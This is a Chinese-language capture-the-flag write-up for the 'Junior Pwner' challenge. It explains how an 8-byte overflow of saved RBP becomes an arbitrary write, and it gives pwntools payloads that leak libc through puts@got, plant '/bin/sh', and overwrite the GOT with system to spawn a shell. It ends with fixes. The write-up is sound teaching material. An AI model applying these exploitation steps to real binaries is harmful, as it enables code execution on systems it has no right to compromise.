# Junior Pwner

## 题目简述

程序循环读取名字，将 64 字节临时缓冲区复制到堆上，再复制到 `main` 的局部数组，最后随机输出三条全局消息之一。二进制启用了 NX，但没有 PIE 和栈 Canary，且只有 Partial RELRO。

`vuln()` 对 64 字节栈缓冲区读取 72 字节。多出的 8 字节只能覆盖 saved RBP，尚未触及返回地址。利用重点因此不是一次性的 ret2libc，而是控制 `main` 恢复后的 RBP，使下一条 `memcpy` 把 64 字节写到攻击者选择的地址。

## 解题过程

漏洞函数如下：

```c
char *vuln() {
    char buf[64];
    puts("Your Name:");
    read(0, buf, 72);

    return memdup(buf, 64);
}
```

函数返回时，前 64 字节被复制到堆块，最后 8 字节则被 `leave`、`pop rbp` 恢复为调用者 `main` 的新 RBP。回到 `main` 后会执行：

```c
memcpy(name, vuln(), 64);
```

编译后的 `name` 地址相对 RBP 为 `rbp-0x50`。所以若把 saved RBP 改成 `target+0x50`，这次 `memcpy` 就会把输入的前 64 字节复制到 `target`，形成可重复的定长任意地址写。

第一阶段把全局 `messages` 数组的三个元素都改为 `puts@got`：

```python
messages = 0x4041C0

payload = flat(
    (3 * p64(exe.got["puts"])).ljust(64, b"\x00"),
    messages + 0x50,
)
io.send(payload)
```

下一次 `puts(messages[rand() % 3])` 无论随机到哪个下标，都会把 `puts` 的已解析 GOT 内容当字符串输出。根据泄露值减去所给 libc 中 `puts` 的偏移即可恢复 libc 基址。

第二阶段再次写 `messages`，让三个元素均指向紧随其后的 `/bin/sh`：

```python
payload = flat(
    (3 * p64(messages + 24) + b"/bin/sh\x00").ljust(64, b"\x00"),
    messages + 0x50,
)
io.send(payload)
```

最后利用 Partial RELRO 改写 GOT。将 `puts@got` 改成 libc 的 `system`，并把相邻、后续仍会用到的 GOT 项恢复为各自 PLT 跳板，避免整段 64 字节覆盖破坏程序继续运行所需的函数：

```python
replacement = flat(
    libc.sym.system,
    exe.plt.setbuf,
    exe.plt.read,
    exe.plt.srand,
    exe.plt.memcpy,
    exe.plt.time,
    exe.plt.malloc,
    exe.plt.rand,
)

payload = flat(replacement, exe.got["puts"] + 0x50)
io.send(payload)
```

此后程序原本的 `puts(messages[rand() % 3])` 变成 `system("/bin/sh")`。进入 shell 后读取到：

```text
shellmates{Never_trUst_aSlR_eV3N_jUn1Or$_C0ULd_BRE4K_It!}
```

## 方法总结

本题展示了 saved-RBP 覆盖的利用价值。溢出没有直接碰到返回地址，并不代表只能造成崩溃；只要调用者随后用 RBP 相对寻址访问局部变量，伪造栈帧指针就可能转化为任意地址写。稳定利用还利用了三项条件：非 PIE 使全局数组和 GOT 地址固定，信息泄露绕过 libc ASLR，Partial RELRO 允许改写 GOT。

修复应把读取长度限制为缓冲区大小，并启用栈 Canary、PIE 与 Full RELRO。还应避免忽略 `read()` 的实际返回长度；当前代码无论读入多少字节都固定复制 64 字节，也会把未初始化栈内容带入后续流程。
